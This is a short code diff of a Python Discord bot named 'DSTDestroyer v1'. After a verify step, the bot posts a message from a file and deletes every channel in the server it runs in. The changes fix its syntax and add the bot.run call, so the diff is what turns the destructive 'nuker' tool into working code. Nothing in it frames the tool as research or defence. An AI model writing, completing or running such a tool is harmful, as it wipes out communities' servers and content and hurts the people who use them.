@@ -8,12 +8,12 @@ import random
 print(pyfiglet.figlet_format('DSTDestroyer v1'))
 
 token = input('Token: ')
-bot = commands.Bot('-')
+bot = commands.Bot('.')
 
 auth = hashlib.md5(str(random.randint(10000,99999999)).encode()).hexdigest()
 print(f'''Please enter the command: 
 
-verify {auth}
+.verify {auth}
 
 Into the server so we can get the ID.
 ''')
@@ -22,10 +22,14 @@ Into the server so we can get the ID.
 async def verify(ctx, token1):
   global auth
   if token1 == auth:
-    input('Press enter to start.'):
-      ctx.send(open('message.txt').read())
+    input('Press enter to start.')
+    await ctx.send(open('message.txt').read())
+    time.sleep(5)
     for c in ctx.guild.channels:
+      time.sleep(1)
       await c.delete()
-   else:
+  else:
     print('Wrong Token...')
+
+bot.run(token)
 
